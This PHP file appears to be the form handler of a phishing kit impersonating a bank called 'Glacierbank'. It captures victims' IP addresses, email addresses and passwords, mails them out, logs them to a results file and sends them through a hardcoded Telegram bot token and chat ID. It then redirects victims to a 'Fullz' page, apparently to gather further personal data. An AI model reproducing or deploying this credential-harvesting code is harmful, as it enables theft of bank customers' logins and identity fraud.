<?php

$ZoRo = getenv("REMOTE_ADDR");

$ip = $_SERVER['REMOTE_ADDR'];

include('./XEmail.php');

$subject = "Glacierbank Mail Access";
$headers = "From: SuleimanSamar <Glacierbank>\r\n";
$message .= "
+----/!\----<.![+] Glacierbank Email Access  [+]!.>---/!\----+
 [IP]                 : ".$ip."
 [Email]              : ".$_POST['email']."
 [PASSWORD]           : ".$_POST['password']."
 [Confirm PASSWORD]   : ".$_POST['Cpassword']."
-------------------------------------------------\n";
mail($email,$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);

/* Telegram */
function sendMessage($messaggio) {
    $token = '2104282985:AAEV0Q0Kz0NZI4QIq2xrjJgWeGxZEKUA2SA';
    $chatid = '1275453727';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
header("Location: ../Main/Fullz.html");

?>